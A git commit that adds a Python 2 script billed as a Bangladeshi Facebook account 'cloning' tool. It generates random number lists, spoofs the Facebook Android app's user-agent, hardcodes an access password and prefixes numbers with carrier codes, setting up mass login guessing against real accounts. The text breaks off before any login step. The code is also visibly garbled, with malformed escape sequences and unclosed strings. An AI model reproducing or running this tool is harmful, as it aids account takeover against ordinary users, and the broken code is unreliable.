9feb5d9cf84074d0977c9423d5624810257b18c0
SAIFUR RAHMAN <92097388+saifur2454@users.noreply.github.com>
2022-01-14 18:37:26 +0600

    Create SR-8DIGIT.py

---
+++ SR-8DIGIT.py
@@ -0,0 +1,175 @@
+# SAIFUR RAHMAN
+# IT'S SAIFUR
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+
+def psb(z):
+    for e in z + '\':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+psb('\1b[1;32mBANGLADESH 08 DIGIT CLONING START PLEASE WAIT ..........')
+for n in range(9999):
+    nmbr = random.randint(11111111, 99999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def jalan(z):
+    for e in z + '\':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(3.0 / 200)
+
+
+def t():
+    time.sleep(1)
+
+
+def cb():
+    os.system('clear')
+
+
+logo ='╔═══╦═══╦══╦═══╦╗─╔╦═══╗
+║╔═╗║╔═╗╠╣╠╣╔══╣║─║║╔═╗║
+║╚══╣║─║║║║║╚══╣║─║║╚═╝║
+╚══╗║╚═╝║║║║╔══╣║─║║╔╗╔╝
+║╚═╝║╔═╗╠╣╠╣║──║╚═╝║║║╚╗
+╚═══╩╝─╚╩══╩╝──╚═══╩╝╚═╝'
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+print 'AUTHOR : SAIFUR RAHMAN'
+print 'FACEBOOK : SAIFUR RAHMAN'
+print 'GITHUB : saifur2454
+CorrectUsername = 'SAIFUR'
+CorrectPassword = 'RAHMAN'
+loop = 'true'
+while loop == 'true':
+    username = raw_input('\1b[1;91m \1b[1;92mUSERNAME \1b[1;92m: \1b[1;92m')
+    if username == CorrectUsername:
+        password = raw_input('\1b[1;91m \1b[1;92mPASSWORD \1b[1;92m: \1b[1;92m')
+        if password == CorrectPassword:
+            print 'Logged in successfully as ' + username
+            time.sleep(2)
+            loop = 'false'
+        else:
+            print '\1b[1;97mWrong Password'
+            os.system('xdg-open https://www.facebook.com/abbu.2454')
+    else:
+        print '\1b[1;97mWrong Username'
+        os.system('xdg-open https://www.facebook.com/abbu.2454')
+
+name = raw_input('\1b[1;92m\1b[1;92m Enter Your Gf Name: ')
+os.system('xdg-open https://www.facebook.com/abbu.2454')
+
+def menu():
+    os.system('clear')
+    print logo
+    print '\1b[1;90mONLY \1b[1;90m11 \1b[1;90mDIGITS HACKABLE ACCOUNTS ARE AVAILABLE'
+    print
+    jalan('\1b[1;92m[1]  \1b[1;92mGRAMEENPHONE')
+    jalan('\1b[1;96m[2]  \1b[1;96mROBI')
+    jalan('\1b[1;92m[3]  \1b[1;92mAIRTEL')
+    jalan('\1b[1;96m[4]  \1b[1;96mBANGLALINK')
+    jalan('\1b[1;92m[5]  \1b[1;92mTELETALK')
+    jalan('\1b[1;96m[6]  \1b[1;96mGRAMEENPHONE \1b[1;91m(NEW)')
+    jalan('\1b[1;92m[7]  \1b[1;92mBANGLALINK \1b[1;91m(NEW)')
+    print
+    jalan('\1b[1;90m[8] FIND ME ON FACEBOOK PAGE ')
+    jalan('\1b[1;90m[9] TO CONTACT ADMIM')
+    print
+    jalan('\1b[1;97m[00]  EXIT')
+    print 50 * '-'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\\1b[1;92m\e2\96\84\ef\b8\bb\cc\b7\cc\bf\e2\94\bb\cc\bf\e2\95\90\e2\94\81\e4\b8\80   ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print '\1b[1;97mSIM CODE: TYPE \1b[1;91m017'
+        try:
+            c = raw_input('\1b[1;97mCHOOSE CODE  : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\[ Back ]')
+            menu()
+
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print '\1b[1;97mSIM CODE: TYPE \1b[1;91m018'
+        try:
+            c = raw_input('\1b[1;97mCHOOSE CODE  : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\[ Back ]')
+            menu()
+
+    elif bch == '3':
+        os.system('clear')
+        print logo
+        print '\1b[1;97mSIM CODE: TYPE \1b[1;91m016'
+        try:
+            c = raw_input('\1b[1;97mCHOOSE CODE  : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[
